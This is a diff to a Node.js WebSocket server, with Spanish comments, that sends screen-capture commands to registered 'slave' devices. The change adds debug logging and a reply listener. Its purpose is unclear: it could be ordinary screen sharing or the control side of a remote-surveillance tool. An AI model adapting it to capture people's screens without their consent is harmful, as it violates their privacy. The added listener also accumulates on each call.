@@ -35,6 +35,7 @@ wss.on('connection', (ws, req) => {
             } else if (msg.startsWith('START_SCREENSHARE:')) {
                 // Comando para capturar pantalla
                 const slaveId = msg.replace('START_SCREENSHARE:', '');
+                console.log(`[DEBUG] Comando de captura de pantalla para esclavo ${slaveId}`);
                 startScreenShareCommand(slaveId);
             }
         } catch (e) {
@@ -80,21 +81,36 @@ function sendSlaveList(ws) {
 
 // Función para enviar el comando de captura de pantalla a un esclavo
 function startScreenShareCommand(slaveId) {
+    console.log(`[DEBUG] Verificando si el esclavo ${slaveId} está registrado...`);
     const slaveSocket = devices.slaves.get(slaveId);
-    if (slaveSocket) {
-        // Enviar comando al esclavo para iniciar la captura de pantalla
-        if (slaveSocket.readyState === WebSocket.OPEN) {
-            slaveSocket.send(JSON.stringify({
-                action: "START_SCREENSHARE",
-                timestamp: Date.now()
-            }));
-            console.log(`[COMMAND] Enviado comando START_SCREENSHARE al esclavo ${slaveId}`);
-        } else {
-            console.log(`[ERROR] El esclavo ${slaveId} no está disponible`);
-        }
-    } else {
-        console.log(`[ERROR] Esclavo con ID ${slaveId} no encontrado`);
+    
+    if (!slaveSocket) {
+        console.log(`[ERROR] Esclavo con ID ${slaveId} no encontrado.`);
+        return;
     }
+    
+    // Verificamos si el WebSocket está abierto antes de enviar el comando
+    if (slaveSocket.readyState !== WebSocket.OPEN) {
+        console.log(`[ERROR] El esclavo ${slaveId} no está disponible (estado WebSocket no OPEN).`);
+        return;
+    }
+
+    console.log(`[DEBUG] Enviando comando START_SCREENSHARE al esclavo ${slaveId}`);
+    slaveSocket.send(JSON.stringify({
+        action: "START_SCREENSHARE",
+        timestamp: Date.now()
+    }));
+    
+    // Confirmar el envío del comando
+    console.log(`[COMMAND] Comando START_SCREENSHARE enviado al esclavo ${slaveId}`);
+    
+    // Esperar respuesta del esclavo (simulación de procesamiento)
+    slaveSocket.on('message', (response) => {
+        const data = JSON.parse(response);
+        if (data.action === 'SCREENSHARE_STARTED') {
+            console.log(`[DEBUG] El esclavo ${slaveId} ha comenzado la captura de pantalla.`);
+        }
+    });
 }
 
 // Iniciar servidor
